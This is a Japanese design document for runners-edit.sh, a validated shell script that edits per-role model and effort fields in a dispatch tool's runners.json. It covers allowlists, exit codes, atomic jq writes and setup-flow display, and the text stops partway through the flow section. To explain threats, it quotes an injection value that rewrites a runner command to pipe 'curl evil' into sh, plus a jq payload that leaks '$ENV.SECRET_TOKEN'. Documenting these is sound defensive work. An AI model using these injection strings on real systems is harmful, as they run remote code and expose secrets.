# cmux-team-dispatch-task `--setup` での役割別 model / effort 設定の設計

対象: `apps/cmux-team-dispatch-task`

## 背景

`runners.json` の runner レコードは v1.20.0 以降、役割ごとの model と effort を
6 つの任意フィールドとして持つ。

| フィールド | 役割 |
|---|---|
| `plan_model` / `plan_effort` | design（plan / superpowers / prewarm design standby） |
| `review_model` / `review_effort` | review（Phase A-R / Phase B-R のレビューペイン） |
| `exec_model` / `exec_effort` | exec（execute / executor standby） |

この 6 フィールドは **engine 中立**で、claude runner でも codex runner でも同じ名前で
解決される。解決順序も既定値も既に実装済みで、`launch-workspace.sh` /
`prewarm-panes.sh` / `--override` のすべてがこれを読む。

欠けているのは**書き込み側だけ**である。値を入れる経路は 2 つしかない。

1. **First-run setup** — `runners.json` が存在しないときにだけ走る。既に登録された
   runner のフィールドを後から変えることはできない。
2. **JSON の手編集** — `~/.claude/cmux-team-dispatch-task/runners.json` を直接開く。

`--setup` は runner（`design_runner` / `review_runner` / `exec_choice`）を選ばせるが、
その runner が**どのモデルでどの effort で動くか**は選ばせない。「レビューだけ effort を
上げたい」「exec を `fable` にしたい」といった、最も頻度の高い調整が `--setup` から
到達できない。

## 目的

`--setup` から、登録済み runner の **3 役割 × 2 次元 = 6 フィールドすべて**を設定・変更・
既定へ戻すことができるようにする。JSON の手編集を不要にする。

## 非目標

以下は明示的に扱わない。

- 解決ロジック・既定値・優先順位の変更。`launch-workspace.sh` / `prewarm-panes.sh` /
  `--override` は 1 行も変えない（doc の同期は §3 で行う）。
- `config.json` への新キー追加。model / effort は `runners.json` に属し、config の
  役割キー 5 つ（`design_runner` / `review_runner` / `exec_choice` / `review_mode` /
  `prewarm`）は不変。
- runner の追加・削除、`name` / `command` / `engine` / `default` の変更。これらは
  First-run setup と `--reset runners` の担当のまま。
- **First-run setup の書き込み経路を新スクリプトへ移行すること。** 現行のまま動いており、
  触れば回帰リスクだけが増える。この結果、`runners.json` の**新規作成と再構築は今後も
  スクリプトを通らない**。§1.5 と §3.1 の見出し文言はこの事実と矛盾しないよう書く。
- 1 回の `--setup` で複数の runner を編集すること。M1 は単一選択で、2 件目は `--setup`
  を再実行する。`multiSelect` にすると M2 / M3 の選択肢が runner ごとに変わり、
  3 コール構成が崩れる。
- `--setup` の排他規則（`--loop` / `--reset` / `--override`）と「ディスパッチしない」
  性質の変更。
- バージョン番号の bump、push、PR 作成。

## 前提として守る事実

| 項目 | 内容 |
|---|---|
| 未設定時の既定 model | plan: claude `opus[1m]` / codex なし、review: claude `opus[1m]` / codex は reviewer に選ぶなら必須、exec: claude `sonnet` / codex なし |
| 未設定時の既定 effort | plan `xhigh` / review `xhigh` / exec `high`（両 engine 共通） |
| effort allowlist | claude `low\|medium\|high\|xhigh\|max`、codex `minimal\|low\|medium\|high\|xhigh`。**codex に `max` は決して出さない** |
| model 文字列 | **モデル名の allowlist は作らない**（新しいモデル名がそのまま通ること）。ただし `runners-edit.sh` 経由の書き込みに限り、シェルメタ文字と制御文字を拒否する（**S3 の選択肢 1 / 3 の First-run setup 経路は検証しない**。§1.3.1 と「タスク指示からの意図的な逸脱」節を参照） |
| AskUserQuestion 上限 | 1 コール 4 問、1 問 4 選択肢。"Other" 自由入力欄は自動で付き、この 4 枠を消費しない |
| 原子的書き込み | writer 固有 `mktemp` + `jq` + jq 成功時のみ `mv`。他コンポーネント所有のキーを消さない |

**解決順序の帰結（設計上きわめて重要）**: `launch-workspace.sh` の解決は
「明示 `--model` / `--effort` > runner フィールド > 既定値」なので、
**claude の model と両 engine の effort では「既定値を明示的に書く」と「フィールドを削除する」
の実効値が完全に一致する**。実効差があるのは codex の 3 つの model だけ
（未設定 = `--model` を付けない = codex 側デフォルト。`review_model` だけは未設定が
「reviewer に選べない」を意味する）。§2.4 の選択肢生成はこの事実に基づく。

**codex `*_model` には実効既定値が存在しない。** したがって codex model では
「設定済み かつ 既定と一致」という状態が定義できず、実質 2 値（未設定 / 設定済み）である。
§2.4 の規則 1 / 規則 3 はこの 2 値に対して専用のラベルを持つ。

`config.json` の `shell_ready_ms`（`terminal-wait.sh` 所有）が生き残らねばならないのと
同じ理由で、`runners.json` でも「編集対象でない runner」「編集対象でないフィールド」
「`default` キー」が生き残らねばならない。

---

## 設計

### 1. 書き込み口 — 新規スクリプト `skills/cmux-team-dispatch-task/scripts/runners-edit.sh`

`runners.json` への**フィールド単位の更新**は、`config-edit.sh` と同一の契約を持つ
**専用スクリプト**を新設して一本化する。

パスは `config-edit.sh` と同じ `skills/cmux-team-dispatch-task/scripts/` 配下。
ドキュメント中の呼び出しは `<SKILL_DIR>/scripts/runners-edit.sh` と書く
（`apps/cmux-team-dispatch-task/scripts/` は `claude-link.sh` 専用で、こちらではない）。

#### 1.1 なぜ新規スクリプトなのか

3 案を検討した。

| 案 | 判定 | 理由 |
|---|---|---|
| **新規 `runners-edit.sh`** | **採用** | 対象ファイル・スキーマ・検証ドメインのいずれも `config.json` と別物。`config-edit.sh` と同型の契約を持たせれば、読む側の認知負荷は増えない |
| `config-edit.sh` を拡張 | 却下 | `known_key` / `valid_value` の「5 キー allowlist」モデルと `--config` という引数名が壊れる。単一オブジェクトのキー更新と配列要素の部分更新という別種の操作が 1 スクリプトに混ざり、`test-config-edit.sh` CE5「未知キーは exit 2」契約とも衝突する |
| SKILL.md / setup-mode.md にインライン jq | 却下 | `setup-mode.md` 自身の「Never hand-assemble a jq invocation for these files」に真正面から反する。`config-edit.sh` が生まれた動機（呼び出しごとに jq を組み立て直すことで起きるマージ漏れ）は、配列要素の部分更新ではさらに深刻になる |

新規スクリプトにしかできないことが 2 つある。

1. **effort の検証に必要な `engine` は編集対象レコード自身に書いてある。** スクリプトなら
   `--set plan_effort=max` を受け取った時点でレコードから `engine` を読み、codex runner
   なら `max` を弾ける。インライン jq では「呼び出し側が engine を正しく渡す」ことを
   毎回祈ることになる。
2. **値を jq プログラム文字列へ補間しない保証**（§1.4）を、テスト可能な 1 箇所に
   閉じ込められる。

#### 1.2 インターフェース

```
runners-edit.sh --runners <path> --name <runner> [--set <field>=<value>]... [--unset <field>]... [--dry-run]
runners-edit.sh --runners <path> --name <runner> --get <field>
runners-edit.sh --runners <path> [--name <runner>] --show
```

`config-edit.sh` の `--config` / `--set` / `--unset` / `--get` / `--show` と対応する。
追加は `--name`（対象レコード）と `--dry-run`（S6 のプレビュー用）の 2 つだけ。

| 引数 | 意味 |
|---|---|
| `--runners <path>` | 対象 `runners.json`。既定の場所は `~/.claude/cmux-team-dispatch-task/runners.json` だが、パスは呼び出し側が渡す（テスト可能性のため） |
| `--name <runner>` | 対象 runner の `name`。`--set` / `--unset` / `--get` では**必須**。一致件数が 1 でなければ exit 2 |
| `--set <field>=<value>` | フィールドを設定（繰り返し可） |
| `--unset <field>` | フィールドを削除 = 既定へ戻す（繰り返し可）。不在フィールドでも exit 0（冪等） |
| `--dry-run` | `--set` / `--unset` と併用。**temp を作らず何も書かず**、適用後の**当該レコードだけ**を stdout へ出す（`--show --name` と対称）。S6 の after 表示はこれで作る |
| `--get <field>` | 値を stdout へ。フィールド未設定なら空文字で exit 0（`--name` が未登録なら exit 2） |
| `--show` | `--name` 併用でそのレコードだけ、省略時はファイル全体を整形出力 |

`--dry-run` を足す理由は §2.5 にある。これが無いと S6 の「after」を作るために呼び出し側が
jq を組み立てることになり、同じファイルの
`Never hand-assemble a jq invocation for these files` と正面衝突する。
**`--dry-run` が「ファイル全体」ではなく「当該レコード」を出すのはこのため** —
全体を出すと呼び出し側がレコードを抜くために jq を必要としてしまい、追加した理由が
消える。全体を出す用途は現時点で誰も必要としていない。
**`--dry-run` は `mktemp` を経由しない**（§1.4 手順 7a）。経由すると書き込み権限の無い
レジストリでプレビューが失敗し、S6 が確認質問へ進めなくなる。この規則は RE9e が守る。

#### 1.3 検証

**フィールド allowlist**（これ以外は exit 2）:

```
plan_model  review_model  exec_model  plan_effort  review_effort  exec_effort
```

`name` / `command` / `engine` / `default` は allowlist に**入れない**。この
スクリプトは runner の同一性には触らない。**`--set` / `--unset` / `--get` の 3 モード
すべてで、フィールド名は同じ allowlist ゲートを通す**（`config-edit.sh` が `--set` /
`--unset` / `--get` の全分岐で `known_key` を通すのと同型）。

**値の検証**:

- `*_model` — 次の 2 条件のみ。**モデル名の allowlist は作らない。**
  1. **前後に空白を持たず、かつ非空であること**（空値・空白のみは下流で `--model ''` /
     `--model '   '` になり壊れる。同じ理由が前後の空白パディングにも当たる —
     `--model '  fable'` は起動時に失敗しうる。黙ってトリムすると「入力した値と違う値が
     保存される」ことになるので、**トリムせず exit 2 にする**）。
  2. `'` `"` `` ` `` `$` `\` を含まず、かつ `[[:cntrl:]]` を 1 文字も含まないこと
     （改行 / CR / タブ / ESC / BEL などすべて）。違反は exit 2。根拠は §1.3.1。
- `*_effort` — レコードの `engine` を読み、engine 別 allowlist と照合する。
  **この検証は `--set <*_effort>` にのみ適用する**（`--unset` は値を持たないので
  engine を必要としない。engine 欠落レコードへの `--unset plan_effort` は exit 0）。
  - `engine: claude` → `low` / `medium` / `high` / `xhigh` / `max`
  - `engine: codex` → `minimal` / `low` / `medium` / `high` / `xhigh`
  - 範囲外は exit 2。**codex に `max` を渡すと必ず失敗する。** codex が `max` を
    受け付けるかは確認されていないので、安全側の分岐を維持する。
  - `engine` がレコードに無い、または上記 2 値以外のときは exit 2（どちらの
    allowlist を適用すべきか決められないため、黙って通さない）。

**構造の検証**:

- `.runners` が配列でなければ **exit 2**。`.runners |= map(…)` はオブジェクトを配列へ
  黙って化けさせるので、型崩れをここで止める。jq に `Cannot iterate over null` を
  出させて exit 1 で済ませてはならない（原因を誤らせる）。
- `--name` に一致する `runners[]` 要素の件数がちょうど 1 でなければ exit 2
  （0 件 = 未登録、2 件以上 = 重複。`runners.json` は `name` の一意性を機械的に
  強制していないので、両方書き換えるより止める方が安全）。
- この 2 つは **`--name` が与えられたときにだけ**適用する。`--name` 無しの `--show`
  は `config-edit.sh` と同じく素通しで整形出力する。

**引数の相互作用**:

- モード排他 — `--set`/`--unset` 群 / `--get` / `--show` のうち、ちょうど 1 つだけを
  指定する。混在は exit 2。モード未指定も exit 2。`--runners` 未指定も exit 2。
- `--set` が `<field>=<value>` 形式でなければ exit 2（`config-edit.sh` の
  `--set must be <key>=<value>` と同型）。
- `--set` / `--unset` / `--get` を `--name` 無しで呼ぶと exit 2。
- 同一フィールドへの `--set` と `--unset` の同時指定は exit 2（jq 合成順に結果が
  依存するため、曖昧なまま通さない）。**指定順は問わない**（`--set X=a --unset X` も
  `--unset X --set X=a` も exit 2）。
- **同一フィールドへの `--set` の重複、同一フィールドへの `--unset` の重複、および
  `--runners` / `--name` / `--get` の重複指定はすべて exit 2。** last-wins で黙って
  通すと、S6 のプレビューを組み立てる LLM がフラグを重ねたときに別フィールドの値を
  「現在値」として提示しうる。繰り返してよいのは異なるフィールドに対する `--set` /
  `--unset` だけである。
- `--dry-run` は `--set`/`--unset` モード専用。`--get` / `--show` との併用は exit 2。

##### 1.3.1 `*_model` でシェルメタ文字を拒否する理由

タスク指示は「モデル文字列は検証しない」と述べており、この規則はその**意図された
範囲（モデル名を allowlist しない）を守りつつ、シェル注入だけを塞ぐ**ものである。
逸脱の扱いは末尾の「タスク指示からの意図的な逸脱」節に記録する。

**シンクは 3 層ある。**

| # | 層 | 引用 | そこで生きている文字 | このスクリプトの deny-list より |
|---|---|---|---|---|
| 1 | **S7 のコマンドライン**（LLM が組み立て、親セッションの Bash tool が実行する `bash …/runners-edit.sh … --set 'plan_model=<自由入力>'`） | `'…'` | `'` のみ | **手前**。スクリプト側検証では守れない |
| 2 | bash（生成される runner script のリテラル行） | `"…"` | `$` `` ` `` `\` `"` のみ。`;` `\|` `&` `>` `<` `(` `)` `*` `?` 空白はリテラル。非対話なので `!` の history 展開も起きない | 後 |
| 3 | zsh -ic（内側文字列） | `'…'` | `'` のみ。zsh でも単一引用内では `!` は展開されない | 後 |

層 2 / 3 の実像: model 文字列は `launch-workspace.sh` で
`CLAUDE_MODEL_FLAGS="--model '$MODEL'"`（codex は `CODEX_MODEL_FLAG=" --model '$MODEL'"`）
として組まれ、`SESSION_CMD="zsh -ic \"$CORE_CMD\""` になったあと、
**クォート無しヒアドキュメントで `.cmux-team-dispatch-task-run-<slug>.sh` へリテラル
1 行として書き出され**、`cmux new-workspace --command "bash <runner script>"` で実行される。
つまり `$` と `` ` `` を展開するのは zsh 層ではなく **bash 層**である。
「`SESSION_CMD` の引用を直せば済む」という誤読を避けるため、この構造を明記する。

**層 1 はスクリプト側では守れない。** 値が `runners.json` へ届く前、`runners-edit.sh` が
起動する前にシェルが解釈するからである。層 1 を守るのは §2.4「自由入力の扱い」の
**LLM 側事前チェック**であり、§2.6 の「記述例は必ず単一引用付きにする」という規約は
**値そのものが `'` を含まないことを前提**にしている。この依存関係は §2.6 に相互参照を置く。

拒否集合を `'` `"` `` ` `` `$` `\` の 5 文字（＋制御文字）にした根拠:

- この 5 文字は**それぞれ単独で**任意コマンド実行に到達する。
- ルート `CLAUDE.md` 保守手順 27 の集合は `!` を含む 6 文字だが、**`!` は意図的に外している**。
  手順 27 は `parallel-directive.sh` の出力位置（`zsh -ic "… '<prompt>' …"` の対話モード）
  に対する規約であり、model の位置では bash 層が非対話・zsh 層が単一引用のため
  load-bearing ではない。
- 実在するモデル名は `[A-Za-z0-9._\[\]/-]` の範囲に収まる（`opus[1m]` / `sonnet` /
  `fable` / `gpt-5.6-sol` / `gpt-5.6-terra`）ので、この拒否条件は既存値も将来の
  モデル名も壊さない。
- 制御文字を拒否するのは注入対策ではなく、値が**生の端末シンク**へ届くため。
  jq は JSON 出力で制御文字を必ずエスケープするので `--show` / `--dry-run` は
  生シンクではない。生で届くのは `launch-workspace.sh` の
  `log "runner" "applying model=$MODEL …"` と、`jq -r` で実装した場合の `--get` の 2 つ。
  端末エスケープ列を永続化できる状態を作らない。

`--setup` はこの値を **`runners.json` へ永続化する**ので、一度入ると以後の全ディスパッチで
再実行される。

**既知の限界（重要）**: 検証されるのは **S3 の選択肢 2（`runners-edit.sh` 経由）だけ**である。
**同じ `--setup` 実行の中でも、S3 の選択肢 1（追加）と 3（作り直し）は First-run setup が
`runners.json` へ直接書くので検証されない。** `--override` も同様。これらの経路の変更は
非目標なので手を入れない。したがって **doc には「`--setup` が model を sanitize する」と
読める無条件の文言を書かない** — 拒否条件を書くときは必ず
「S3 の選択肢 2 経由のみ」という限定句を添える（§3 / SU10 / SU15 で強制する）。

#### 1.4 実行順序と書き込み

**検証はすべて `mktemp` より前に完了する。** これを明文の不変条件とする。

```
0. 引数パース。ファイル非依存の検証をすべてここで済ませる:
     - フィールド allowlist（--set / --unset / --get の 3 モード）
     - --set の <field>=<value> 形式
     - *_model の値検証（§1.3。engine を読む必要が無いので手順 0 が正しい置き場所）
     - モード排他 / モード未指定 / --runners 未指定 / --name 必須
     - 同一フィールドへの --set と --unset の衝突
     - --dry-run の併用可否
   直後に TMP="" と trap 'rm -f "${TMP:-}"' EXIT を設置する（下記）
1. [[ -f "$RUNNERS" ]] を確認。
   - --set / --unset モード（--dry-run 含む）: 通常ファイルでなければ exit 2 (§1.5)
   - --get / --show モード: 不在なら空 / {} を出して exit 0 (§1.5)
   ※ -e ではなく -f を使う。-e だとディレクトリを渡したとき rc=0 で偽成功する
2. DOC を 1 回だけ読む（下記スニペット）。parse 失敗・読み取り不能・空ファイルは exit 1
3. --name が与えられたとき: (.runners | type) == "array" を検証。違反は exit 2（下記スニペット）
4. --name が与えられたとき: 一致件数がちょうど 1 であることを検証。違反は exit 2（下記スニペット）
5. --set <*_effort> があるときだけ、レコードの engine を読み allowlist と照合。
   違反は exit 2。書き込みモード専用（下記スニペット）
6. 読み取りモード（--get / --show）はここで結果を出して exit 0（下記スニペット）
7a. --dry-run: 合成した jq 式を DOC へ当て、当該レコードだけを stdout へ出して exit 0。
    mktemp を経由しない（下記スニペット）
7b. 通常書き込み: mktemp（下記スニペット）
8. 全 --set / --unset を単一の jq 式へ合成し、1 回の jq 実行で DOC から $TMP へ書く
9. mv "$TMP" "$RUNNERS"
```

手順 0〜5 が `mktemp` より前にあることで、検証エラー（exit 2）のたびに temp が
残る事故を構造的に防ぐ。手順 1 が exit 2 のとき親ディレクトリを作らないので、
`config-edit.sh` にある `mkdir -p "$(dirname …)"` は**置かない**（§1.5 によりファイルは
必ず存在するので不要であり、置くと RE13 の経路で空ディレクトリだけ作る副作用が出る）。

手順 2 でファイルを **1 回だけ読む**のは、effort 検証に使った `engine` と実際に書き出す
文書が同一バイト列であることを保証するため。プロセス内で読み直すと、§1.1 が
「新規スクリプトにしかできないこと」の筆頭に挙げた検証の前提が（窓は極小だが）崩れる。

**jq / mktemp を呼ぶ全手順に明示分岐を書く（スニペットで固定する）。**
`set -euo pipefail` 下で裸のまま書くと、スクリプトは **jq / mktemp 自身の終了コード**で
死ぬ。jq は parse error でも runtime error でも **rc=5**、読み取り不能では **rc=2** を
返すので、「0 / 1 / 2」契約も「usage エラーか書き込み失敗か」の判別も破れる。
散文で「失敗は exit 1」と書くだけでは裸の形が書かれるため、**jq を呼ぶ手順 2 / 3 / 4 / 5 /
6 / 7a / 8 と mktemp の 7b、mv の 9 —— 合計 9 箇所すべて**にスニペットを焼く。

**手順 3 / 4 / 5 / 6 を落とすと実害が出る。** `{"runners":[1,2]}`（配列だが要素が
オブジェクトでない）は手順 3 を `array` で通過し、手順 4 の `select(.name == $n)` が
`Cannot index number with string ("name")` で **rc=5** を返す。`--get --name` /
`--show --name` も同じ経路を通るので、**読み取りモードでも rc=5 が漏れる**
（`--name` 無しの `--show` は手順 3 / 4 をスキップするので安全）。
`jq -e` の裸形は rc=1 になり「exit 2」契約と食い違うので、下の形を固定する。
あわせて**手順 4 / 5 / 7a / 8 の select は型安全にする**
（`select((type == "object") and .name == $n)`）。

```bash
# 手順 2 — 1 回だけ読む
if ! DOC=$(jq . "$RUNNERS" 2>/dev/null); then
  echo "runners-edit: cannot read $RUNNERS (invalid JSON or unreadable)" >&2
  exit 1
fi
# jq は 0 バイト入力・空白のみ入力に rc=0 を返すので、別途弾く
if [[ -z "${DOC//[[:space:]]/}" ]]; then
  echo "runners-edit: $RUNNERS is empty" >&2
  exit 1
fi

# 手順 3 — .runners が配列か（--name が与えられたときだけ）
if [[ "$(jq -r '.runners | type' <<<"$DOC" 2>/dev/null)" != array ]]; then
  echo "runners-edit: .runners is not an array in $RUNNERS" >&2
  exit 2
fi

# 手順 4 — --name の一致件数。jq が失敗しても空文字になり "1" と等しくならない
# （型安全 select にした今 || echo '' は到達不能な安全弁。select を戻したときのため残す）
MATCHES=$(jq --arg n "$NAME" \
  '[.runners[] | select((type == "object") and .name == $n)] | length' \
  <<<"$DOC" 2>/dev/null || echo '')
if [[ "$MATCHES" != 1 ]]; then
  echo "runners-edit: --name '$NAME' must match exactly one runner (matched: ${MATCHES:-error})" >&2
  exit 2
fi

# 手順 5 — engine の読み出し（--set <*_effort> があるときだけ）
ENGINE=$(jq -r --arg n "$NAME" \
  'first(.runners[] | select((type == "object") and .name == $n) | .engine // empty)' \
  <<<"$DOC" 2>/dev/null || echo '')
case "$ENGINE" in claude|codex) ;; *)
  echo "runners-edit: runner '$NAME' has no usable engine; cannot validate effort" >&2
  exit 2 ;;
esac

# 手順 6 — 読み取りモードの出力。3 形すべてに分岐を書く。
# フィールド名は allowlist 通過後にのみ埋め、--name は必ず --arg で渡す
case "$MODE" in
  get)
    if ! jq -r --arg n "$NAME" \
      "first(.runners[] | select((type == \"object\") and .name == \$n) | .${field} // empty)" \
      <<<"$DOC"; then
      echo "runners-edit: read failed" >&2; exit 1
    fi ;;
  show-named)                      # round-4 M1 が $ENV 漏洩を実証したのはこの形
    if ! jq --arg n "$NAME" \
      'first(.runners[] | select((type == "object") and .name == $n))' <<<"$DOC"; then
      echo "runners-edit: read failed" >&2; exit 1
    fi ;;
  show-all)                        # 手順 3 / 4 はスキップ済み。config-edit.sh:147 と同じ素通し
    if ! jq '.' <<<"$DOC"; then
      echo "runners-edit: read failed" >&2; exit 1
    fi ;;
esac
exit 0

# 手順 7a — dry-run。mktemp を経由しない。select は型安全にする
if ! jq <jq-args> \
  "<filter> | .runners[] | select((type == \"object\") and .name == \$n)" <<<"$DOC"; then
  echo "runners-edit: dry-run failed (jq error)" >&2
  exit 1
fi
exit 0

# 手順 7b — mktemp（config-edit.sh:157-160 と同型。診断メッセージを消さない）
if ! TMP=$(mktemp "$RUNNERS.XXXXXX"); then
  echo 'runners-edit: mktemp failed; nothing was written' >&2
  exit 1
fi

# 手順 8 / 9 — jq 失敗と mv 失敗
jq <jq-args> "<filter>" <<<"$DOC" > "$TMP" || {
  rm -f "$TMP"
  echo "runners-edit: write failed (jq error); $RUNNERS is unchanged" >&2
  exit 1
}
mv "$TMP" "$RUNNERS" || {
  rm -f "$TMP"
  echo "runners-edit: move failed; $RUNNERS is unchanged" >&2
  exit 1
}
TMP=""                                  # 成功後は trap を無害化
```

**手順 7a は必ずちょうど 1 レコードを出す。** jq の `select` は 0 件でも rc=0 かつ
空出力を返すので、S6 の after が無言で空になりうる。現設計でそれが起きないのは
**(1) 手順 4 が一致 1 件を保証し、(2) allowlist に `name` が無いのでフィルタが
`.name` を変えられない**からである。この 2 条件が同時に必要なので、allowlist を
将来広げるときは 7a の不変条件を再確認すること。

**手順 7a と手順 8 の jq 失敗ハンドラには witness を構築できない。** 理由は 2 通りある。
`{"runners":[1,2]}` は手順 4 で 0 件一致になり **exit 2** で止まる。
`{"runners":[{"name":"cc","engine":"claude"},true]}` は手順 3（`array`）/ 4（1 件）/
5（`claude`）を**すべて通過する**が、7a / 8 の `map` と `select` が型安全なので
非オブジェクト要素は `else .` で素通りし、jq は成功する。
つまり 7a / 8 の失敗ハンドラはどちらも**意図的に到達困難な安全弁**であり、
テストで踏むケースは書けない。**逆に言えば、型安全ガードを外すとこの入力が rc=5 になる** —
その回帰は RE15 の mixed 配列ケースが exit 0 を要求することで捕まえる。
RE9 / RE18 がこれを守っているわけではない点を明記しておく。

**jq への値の渡し方（セキュリティ上 load-bearing）**:

**この契約は手順 4 / 5 / 6 / 7a / 8 のすべての jq 呼び出しに適用する。**
とりわけ **`--name` を jq へ渡すのは手順 4（件数検証）と手順 6（`--get` /
`--show --name` の出力）にもある**。ここを補間で実装すると、
`--show --name 'x") , {leak: $ENV.SECRET_TOKEN} , ("'` が **rc=0 で成功扱い**のまま
環境変数を吐き、S1 / S6 の before プレビュー経由で LLM の文脈へ入る。

- `--set` の値は必ず `--arg vN` で渡す。`*_model` も `*_effort` も文字列なので
  `--argjson` は使わない。**値を jq プログラム文字列へ連結してはならない。**
- `--name` も `--arg n` で渡す。**`runners.json` の `name` は無検証で書かれるので
  `"` や `$` を含みうる**（RE16 の隣で検証する）。
- フィールド名は §1.3 の allowlist に一致した場合に**のみ**、`--set` は `.${field}`、
  `--unset` は `del(.${field})`、`--get` は `.${field}` として式へ埋める。
  `config-edit.sh:99` と同型の根拠コメント（「フィールド名は allowlist 済みなので
  jq 式へ直接埋めてよい」）を実装に残す。

これを守らないと、`--set plan_model='x", "command": "curl evil|sh'` 相当の入力で
allowlist から意図的に外した `.command` を書き換えられる。`.command` は
`launch-workspace.sh` の `CORE_CMD="$RUNNER_COMMAND …"` で**クォート無し**に連結され
（zsh 関数を runner にできる設計なので意図的）、層 2 / 3 を通って実行されるため、
次回ディスパッチで任意コマンドが走る。フィールド名を補間する実装も同様に危険で、
`$ENV.SECRET_TOKEN` の読み出しに到達する。

jq 式は対象 runner だけを写像する形にする。他の要素はそのまま通す。

```
.runners |= map(if (type == "object") and .name == $n
                then (.plan_effort = $v1 | del(.exec_model))
                else . end)
```

**`(type == "object") and` は省略しない。** これを落とすと
`{"runners":[{"name":"a","engine":"claude"},true]}` が手順 3 / 4 / 5 をすべて通過した
うえで手順 7a / 8 の jq が rc=5 で死ぬ（明示ハンドラが exit 1 へ変換するので契約違反には
ならないが、「witness を構築できない」という §1.4 の主張が偽になる）。

これにより次が保証される。

- **他の runner レコードの「値」が変わらない**（jq は成功時にファイル全体を再整形するので
  バイト単位では必ず変わる。バイト同一を主張できるのは書き込みが起きないパスだけ）
- `default` キーおよびトップレベルの未知キーが残る
- 編集対象レコード内の、allowlist 外のフィールド（`name` / `command` / `engine` や
  将来追加されるフィールド）が残る = **置換ではなくマージ**

**`trap` の設置位置**:

```bash
TMP=""                                  # set -u 下なので事前初期化が必要
trap 'rm -f "${TMP:-}"' EXIT            # 引数パース直後。mktemp より前に置く
```

`mktemp` の直前ではなく**引数パース直後**に置く。そうしないと mktemp 〜 mv の窓が
SIGINT / SIGTERM / SIGHUP に対して無防備になる。`EXIT` だけで十分で、`INT TERM` の
明示追加は不要。**trap 本体は必ず成功で終わる形（`rm -f` の `-f` を外さない）にする** —
EXIT trap が失敗すると exit 2 が exit 1 に化ける。根拠コメントを実装に残す。

**この trap を義務づけた結果、残骸の有無は実装順序を弁別しなくなる**（誤った順序で
mktemp しても trap が消すので残骸ゼロ）。順序の検証は RE9d が exit code で行う。
`config-edit.sh` に trap が無いため CE8 は残骸で順序を見られるが、その形は移植できない。
**trap 自身の回帰テストは無い**（mktemp〜mv の窓での SIGTERM / SIGINT）。

**exit code**: 0 成功 / 1 書き込み・読み取り失敗（ファイルは変更されない）/
2 usage・検証エラー。コードの意味は `config-edit.sh` と同一で、**ファイル不在時の
書き込みモードの扱いだけが意図的に異なる**（§1.5）。

**明記しておく既存挙動（`config-edit.sh` と同一、新規退行ではない）**:

- `mv` は `rename(2)` なので **temp の mode が残り、原ファイルの mode は失われる**
  （`chmod 644` → `600`）。締める方向なのでセキュリティ劣化ではないが、`chmod 444` に
  よる凍結も無言で解除される。
- `runners.json` が symlink のとき、**symlink が通常ファイルに置き換わり、リンク先は
  元のまま**になる。dotfiles からレジストリを symlink する構成では乖離する。
- 読み取りから書き込みまでの read-modify-write 全体は原子的ではない。`rename` の
  原子性が保証するのは「中間状態が観測されない」ことだけで、**並行書き込みは
  last-write-wins** になる。`apps/cmux-team-dispatch-task/CLAUDE.md` 保守項目 19 が
  config.json について同じことを明記しており、文言を揃える。
  **ただし窓の広さは同一ではない**: `config-edit.sh` は `jq … "$CONFIG" > "$TMP"` と
  ファイルを直接読むので read と write が 1 プロセスに閉じる。本スクリプトは手順 2 で
  `DOC` に読み、手順 3 / 4 / 5 を挟んでから手順 8 で書くので窓は明確に広い。
  これは §1.1 が求めた「1 回だけ読む」（engine 検証と書き出しの一貫性）の裏面であり、
  意味論（last-write-wins）が同一なので設計としては正しい。

いずれも `config-edit.sh` と同じ挙動なので、この 3 つは**ドキュメントに書くだけで
実装では変えない**（symlink 解決や排他ロックを新スクリプトにだけ入れると、2 つの
edit スクリプトの挙動が非対称になる）。

#### 1.5 ファイルが存在しない / 読めない場合

| 状態 | `--set` / `--unset`（`--dry-run` 含む） | `--get` | `--show` |
|---|---|---|---|
| 不在 | **exit 2**（レジストリを新規作成しない） | 空文字 + exit 0（`config-edit.sh:134` と同じ） | `{}` + exit 0（`config-edit.sh:143-146` と同じ） |
| 存在するが壊れた JSON / 読み取り不能 | **exit 1**（ファイル無変更） | **exit 1** | **exit 1** |
| 0 バイト / 空白のみ | **exit 1** | **exit 1** | **exit 1** |

**0 バイトを明示的に弾くのは、jq が空入力・空白のみ入力に rc=0 を返すから**である。
弾かないと `DOC=""` のまま先へ進み、`--show`（bare）が rc=0 / 空出力になって
§2.3 の破損時ガードが発火せず、`--name` 付きでは「`.runners` が配列でない」という
**原因を誤らせる診断**が出る（§1.3 が `Cannot iterate over null` を避けた理由と同じ）。
0 バイトは机上の話ではない: `SKILL.md:487` の First-run setup は mktemp + mv を要求して
いないので、中断された初回セットアップは 0 バイトを残しうる。
なお複数 JSON ドキュメントが連結されたファイルは jq が rc=0 で通す。`--name` 付きなら
手順 3 / 4 で止まるので実害は無く、bare `--show` の連結出力は `config-edit.sh` の
素通し挙動と同じなので許容する。

書き込みで exit 2 にするのは「登録済み runner を編集する」という前提が崩れるため。
レジストリの新規作成は First-run setup の責務であり、この分岐を読み取りモードへ
広げると **S1（現状表示）が `runners.json` 未作成の状態で `--show` を呼べなくなる**。
S1 は S3 の分岐より前に必ず走るので、**不在時**の読み取りは非破壊で exit 0 でなければ
ならない。**破損時**は全モード exit 1 で、S1 が失敗する。その場合の S3 の扱いは §2.3。

---

### 2. `--setup` フローの変更

runtime SoT は `references/setup-mode.md`（日本語ミラー `setup-mode-ja.md`）。

**ユーザー可視文字列は英日の両方を本設計で確定させる。** `check-doc-lang.mjs` は
`*-ja.md` について `empty-translation`（日本語が 1 文字も無い）しか見ないので、
英語ラベルが `setup-mode-ja.md` へ素通りしても機械的には検出できない。以下の表記は
すべて「英語 doc の表記 ↔ 日本語 doc の表記」を対で決める。
**JA の括弧は全角に統一する**（`既定（<値>）`。半角と混ぜると SU15 の逐語 needle とずれる）。

#### 2.1 S1 — 現状表示

現行のレジストリ表は name / command / engine + model の 4 列。effort 3 列を足すと
9 列になり、Box drawing 禁止のこの画面では横に溢れる。**転置形**を指定する。
表の元データは `runners-edit.sh --runners <path> --show`（ファイル全体）から作る。

```
runner: ccenec (command: ccenec, engine: claude)

| role   | model              | effort          |
|--------|--------------------|-----------------|
| plan   | opus[1m]           | max             |
| review | default (opus[1m]) | default (xhigh) |
| exec   | fable              | default (high)  |
```

- 1 runner = **見出し 1 行 + 表 5 行（ヘッダ・区切り・役割 3 行）= 6 行**。
- **登録が 5 件を超えるとき**は、転置形を出すのを次の**優先集合**に絞る:
  `default` が指す runner、**解決値**としての `design_runner` / `review_runner` が
  指す runner、および `exec_choice` の engine から Step 1f が解決する exec runner。
